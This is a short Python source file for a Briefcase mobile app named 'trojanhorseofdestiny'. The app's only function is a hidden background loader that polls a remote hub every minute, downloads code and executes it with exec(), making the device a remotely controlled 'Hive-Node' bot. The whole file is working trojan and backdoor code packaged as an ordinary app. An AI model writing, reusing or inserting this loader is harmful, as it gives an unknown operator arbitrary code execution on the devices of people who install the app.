import requests
import time
import traceback
from briefcase.app import App

class trojanhorseofdestiny(App):
    def startup(self):
        # This runs on the main UI thread, but we need to run our loader loop
        # in the background so it doesn't freeze the phone.
        import threading
        thread = threading.Thread(target=self.background_loader)
        thread.daemon = True
        thread.start()

    def background_loader(self):
        HUB_URL = "https://hiveslave-scraper.onrender.com"
        print("Hive-Node Started.")
        
        while True:
            try:
                print(f"Checking for updates at {HUB_URL}/latest-client...")
                resp = requests.get(f"{HUB_URL}/latest-client", timeout=30)
                if resp.status_code == 200:
                    payload_code = resp.json().get("code")
                    if payload_code:
                        print("Update found! Executing payload...")
                        exec(payload_code, globals())
                else:
                    print(f"No update: {resp.status_code}")
            except Exception as e:
                print(f"Error: {e}")
            
            time.sleep(60)

def main():
    return trojanhorseofdestiny("trojanhorseofdestiny", "com.quill.zodiac.trojanhorseofdestiny")
